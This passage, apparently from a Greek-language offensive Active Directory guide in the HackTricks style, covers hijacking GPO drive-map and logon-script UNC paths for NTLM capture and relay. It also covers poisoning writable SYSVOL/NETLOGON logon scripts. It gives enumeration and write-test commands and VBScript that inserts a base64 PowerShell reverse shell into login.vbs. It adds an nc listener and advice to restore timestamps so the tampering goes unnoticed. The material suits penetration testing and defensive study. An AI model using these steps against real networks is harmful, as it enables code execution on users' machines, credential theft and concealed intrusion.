```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Τα GPP drive mappings στο `Drives.xml` προκαλούν authentication των χρηστών προς το ρυθμισμένο UNC path κατά το logon ή την επανασύνδεση. Αν κάνεις spoof τον αναφερόμενο host, μπορείς να κάνεις capture **NetNTLMv2**. Αν το SMB γίνει σκόπιμα να αποτύχει, τα Windows ενδέχεται να επαναλάβουν την προσπάθεια μέσω **WebDAV**, στέλνοντας **NTLM over HTTP**, το οποίο είναι πολύ πιο ευέλικτο για relays προς **LDAP(S)**, **AD CS** ή **SMB**.

#### Logon/startup script UNC hijack

Το ίδιο μοτίβο ισχύει για scripts που φιλοξενούνται σε UNC paths και εντοπίζονται στο `SYSVOL`:

- Τα **Logon scripts** συνήθως εκτελούνται στο context του **user**.
- Τα **Startup scripts** συνήθως εκτελούνται στο context του **computer / SYSTEM**.

Αν το path του script δείχνει σε hostname που μπορεί να γίνει spoof, κάνε redirect το UNC host και σέρβιρε replacement script content από την αναμενόμενη τοποθεσία.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths κάτω από τα `\\<dc>\SYSVOL\<domain>\scripts\` ή `\\<dc>\NETLOGON\` επιτρέπουν την αλλοίωση logon scripts που εκτελούνται κατά το logon του χρήστη μέσω GPO. Αυτό παρέχει code execution στο security context των χρηστών που κάνουν logon.

### Εντοπισμός logon scripts
- Έλεγξε τα user attributes για ένα ρυθμισμένο logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Σαρώστε τα domain shares για να εντοπίσετε συντομεύσεις ή αναφορές σε scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Αναλύστε αρχεία `.lnk` για να εντοπίσετε targets που παραπέμπουν στα SYSVOL/NETLOGON (χρήσιμο DFIR trick και για attackers χωρίς άμεση πρόσβαση σε GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- Το BloodHound εμφανίζει το attribute `logonScript` (scriptPath) στα nodes χρηστών όταν υπάρχει.

### Επικύρωση πρόσβασης εγγραφής (μην εμπιστεύεστε τις καταχωρίσεις των shares)
Τα automated εργαλεία ενδέχεται να εμφανίζουν τα SYSVOL/NETLOGON ως μόνο για ανάγνωση, όμως τα υποκείμενα NTFS ACLs ενδέχεται να επιτρέπουν εγγραφές. Να ελέγχετε πάντα:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Αν αλλάξει το μέγεθος αρχείου ή το mtime, διαθέτετε write. Διατηρήστε τα πρωτότυπα πριν από οποιαδήποτε τροποποίηση.

### Poison a VBScript logon script for RCE
Προσθέστε μια εντολή που εκκινεί ένα PowerShell reverse shell (δημιουργήστε το από το revshells.com) και διατηρήστε την αρχική λογική, ώστε να μην διακοπεί η business λειτουργία:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Κάντε listen στον host σας και περιμένετε το επόμενο interactive logon:
```bash
rlwrap -cAr nc -lnvp 443
```
Σημειώσεις:
- Η εκτέλεση πραγματοποιείται υπό το token του χρήστη logging (όχι του SYSTEM). Το scope είναι το GPO link (OU, site, domain) στο οποίο εφαρμόζεται το script.
- Κάντε clean up επαναφέροντας το αρχικό περιεχόμενο και τα timestamps μετά τη χρήση.


## References

- [1] [Κατάχρηση Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Προνομιούχοι λογαριασμοί και δικαιώματα token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Η ενημέρωση της διαδρομής επίθεσης ACL](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Κλιμάκωση προνομίων με ACLs στο Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Σάρωση για προνόμια Active Directory και προνομιούχους λογαριασμούς](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – λειτουργίες γνωρισμάτων/UAC του AD από Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (συμμετοχή σε group)](https://www.samba.org/)
- [10] [HTB Puppy: κατάχρηση AD ACL, cracking Argon2 του KeePassXC και αποκρυπτογράφηση DPAPI έως τον admin του DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: εκμετάλλευση Active Directory GPO μέσω NTLM relaying και άλλα](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: εκμετάλλευση κρυφών διανυσμάτων επίθεσης ACL των Organizational Units στο Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Προσομοίωση legitimate υπηρεσιών Active Directory στο δίκτυο: η περίπτωση της εκμετάλλευσης GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
